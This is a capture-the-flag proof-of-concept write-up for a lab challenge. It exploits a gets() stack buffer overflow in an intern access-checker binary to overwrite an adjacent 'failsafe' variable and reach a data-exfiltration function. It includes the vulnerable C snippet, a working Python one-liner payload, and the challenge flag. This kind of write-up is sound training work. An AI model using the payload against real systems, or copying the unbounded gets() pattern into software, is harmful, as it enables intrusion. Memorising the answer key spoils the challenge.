# PoC — Challenge 02: Ov3rfl0w

**Flag:** `EPI{W3lC0m3_70_0v3RFL0wZ}`
**Vulnerability:** Stack buffer overflow via `gets()` — overwrite adjacent stack variable
**Binary:** `/opt/intern/access-checker` (runs as intern)
**Access needed:** SSH as `intern`

---

## Vulnerability

`main()` has two adjacent stack variables:

```c
char failsafe[64] = "Locked";
char username[64];
// ...
gets(username);  // no bounds check
// ...
if (check_access(username) == 1 && strcmp(failsafe, "Locked"))
    data_exfiltration();
```

`username` and `failsafe` are contiguous on the stack (no gap). Overflowing `username` overwrites `failsafe`. The program calls `data_exfiltration()` only when `failsafe != "Locked"`, so we overwrite `failsafe` with any other string.

**Stack layout (grows downward):**
```
[username 64 bytes][failsafe 64 bytes]
```
Writing 64 bytes fills `username`, byte 65+ overwrites `failsafe`.

---

## Exploit

→ `scripts/exploit_ov3rfl0w.py <SSH_PORT>`

**One-liner (from within the intern SSH session):**

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'r' + b'A'*63 + b'Unlocked\n')" \
  | /opt/intern/access-checker
```

**Flag:** `EPI{W3lC0m3_70_0v3RFL0wZ}`
